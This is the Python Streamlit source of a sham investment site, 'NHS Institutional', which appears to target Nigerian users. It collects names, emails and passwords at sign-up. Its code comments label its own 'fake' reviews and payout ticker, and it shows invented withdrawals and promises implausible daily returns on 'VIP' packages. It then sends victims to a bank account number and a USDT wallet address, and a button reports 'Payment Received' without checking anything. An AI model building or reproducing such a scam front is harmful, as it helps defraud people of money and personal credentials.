import streamlit as st
import time

# --- [CORE SETTINGS] ---
st.set_page_config(page_title="NHS Institutional", page_icon="📈", layout="centered")

# --- [FIXED CSS: VISIBLE TYPING & BOTTOM NAV] ---
st.markdown("""
    <style>
    /* Fix Invisible Text */
    input { color: #1e293b !important; } 
    .stApp { background-color: #ffffff; }
    
    /* Professional Cards */
    .company-card { background: #f8fafc; padding: 20px; border-radius: 15px; border-left: 5px solid #00aeef; margin-bottom: 20px; }
    .vip-card { background: white; border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #e2e8f0; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
    .vip-img { width: 100%; border-radius: 15px; height: 180px; object-fit: cover; }
    
    /* Bottom Navigation Styling */
    .nav-container { position: fixed; bottom: 0; left: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px; border-top: 2px solid #f1f5f9; z-index: 999; }
    
    /* Fake Review Styling */
    .review { font-size: 0.85rem; color: #64748b; font-style: italic; border-bottom: 1px solid #f1f5f9; padding: 5px 0; }
    </style>
""", unsafe_allow_html=True)

# --- [SESSION STATE FOR PAGE NAVIGATION] ---
if "page" not in st.session_state: st.session_state.page = "register"
if "username" not in st.session_state: st.session_state.username = ""

# --- [1. REGISTRATION PAGE] ---
if st.session_state.page == "register":
    st.markdown("<h2 style='text-align:center; color:#00aeef;'>Create Account</h2>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center;'>Enter your official details to begin.</p>", unsafe_allow_html=True)
    
    f_name = st.text_input("First Name", placeholder="Put your first name here")
    l_name = st.text_input("Last Name", placeholder="Put your last name here")
    email = st.text_input("Email Address", placeholder="Put your email here")
    u_name = st.text_input("Username", placeholder="Put your username here")
    pwd = st.text_input("Password", type="password", placeholder="Put your password here")
    
    if st.button("COMPLETE REGISTRATION"):
        if f_name and u_name:
            st.session_state.username = u_name
            st.session_state.page = "home"
            st.rerun()
        else:
            st.error("Please fill all boxes!")

# --- [2. HOME SCREEN (THE DASHBOARD)] ---
elif st.session_state.page == "home":
    st.markdown(f"### Welcome, {st.session_state.username} 👋")
    
    # Company Image & Profile
    st.image("https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=800", caption="NHS Institutional Headquarters")
    
    st.markdown("""
        <div class="company-card">
            <h4>About NHS (Nigerian Help Support)</h4>
            <p>NHS is a premier asset management firm. We bridge the gap between individual capital and industrial growth. Our 2026 Hydrocarbon Charter ensures all client nodes are protected by fixed-yield smart contracts.</p>
        </div>
    """, unsafe_allow_html=True)

    # Fake Live Payout Ticker
    st.markdown("##### 🟢 Live Activity")
    st.write(f"✅ {st.session_state.username}... registered successfully")
    st.write("✅ okon***... just withdrew ₦45,000")
    st.write("✅ emma***... just activated VIP 3")
    
    # Bottom Nav
    st.divider()
    c1, c2, c3 = st.columns(3)
    if c1.button("🏠 Home"): st.session_state.page = "home"; st.rerun()
    if c2.button("💎 Invest"): st.session_state.page = "invest"; st.rerun()
    if c3.button("👤 My"): st.session_state.page = "my"; st.rerun()

# --- [3. INVEST PAGE] ---
elif st.session_state.page == "invest":
    st.markdown("## Investment Portfolios")
    
    vips = [
        {"id": "1", "name": "VIP 1 (Porsche Node)", "price": 5000, "daily": 1150, "cycle": 30, "img": "https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=400"},
        {"id": "2", "name": "VIP 2 (Rolex Node)", "price": 15000, "daily": 3500, "cycle": 20, "img": "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400"},
        {"id": "3", "name": "VIP 3 (Gold Reserve)", "price": 35000, "daily": 8200, "cycle": 20, "img": "https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=400"},
        {"id": "4", "name": "VIP 4 (iPhone 17 Pro)", "price": 70000, "daily": 16500, "cycle": 20, "img": "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=400"},
        {"id": "5", "name": "VIP 5 (Real Estate)", "price": 130000, "daily": 32000, "cycle": 20, "img": "https://images.unsplash.com/photo-1512917774080-9991f1c4c750?w=400"},
    ]

    for v in vips:
        st.markdown(f"""
            <div class="vip-card">
                <img src="{v['img']}" class="vip-img">
                <h4 style="color:#00aeef; margin:10px 0;">{v['name']}</h4>
                <h2 style="margin:0;">₦ {v['price']:,}</h2>
                <p style="font-size:0.9rem; color:#64748b;">Daily: ₦{v['daily']:,} | Cycle: {v['cycle']} Days</p>
            </div>
        """, unsafe_allow_html=True)
        if st.button(f"Activate {v['name']}", key=v['id']):
            st.session_state.page = "payment"
            st.rerun()

    st.markdown("##### 💬 User Reviews")
    st.markdown("<div class='review'>'Just got my first ROI from VIP 1. Moniepoint alert was fast!' - <b>Precious A.</b></div>", unsafe_allow_html=True)
    st.markdown("<div class='review'>'VIP 4 is paying steady. No issues so far.' - <b>Ibrahim K.</b></div>", unsafe_allow_html=True)
    
    st.divider()
    c1, c2, c3 = st.columns(3)
    if c1.button("🏠 Home"): st.session_state.page = "home"; st.rerun()
    if c2.button("💎 Invest"): st.session_state.page = "invest"; st.rerun()
    if c3.button("👤 My"): st.session_state.page = "my"; st.rerun()

# --- [4. PAYMENT PAGE] ---
elif st.session_state.page == "payment":
    st.markdown("### 🏦 Official Settlement Details")
    st.markdown(f"""
        <div style="background:#f0f9ff; border:2px solid #00aeef; padding:20px; border-radius:15px;">
            <p style="color:#64748b; margin:0;">BANK</p>
            <h4 style="margin:0;">Moniepoint</h4>
            <p style="color:#64748b; margin:15px 0 0 0;">ACCOUNT NAME</p>
            <h4 style="margin:0;">{st.session_state.username} (NHS)</h4>
            <p style="color:#64748b; margin:15px 0 0 0;">ACCOUNT NUMBER</p>
            <h2 style="margin:0; color:#00aeef; letter-spacing:2px;">8126419410</h2>
        </div>
        <div style="background:#fff7ed; border:2px solid #f7931a; padding:20px; border-radius:15px; margin-top:15px;">
            <p style="color:#64748b; margin:0;">USDT ADDRESS (BEP20)</p>
            <p style="font-size:0.75rem; word-break:break-all;"><b>0x7b3336E08e8E37E468f78087263b610F584C1C4f</b></p>
        </div>
    """, unsafe_allow_html=True)
    
    if st.button("I HAVE MADE PAYMENT"):
        st.success("Payment Received. Verification in progress.")
        if st.button("Return to Home"):
            st.session_state.page = "home"
            st.rerun()
            
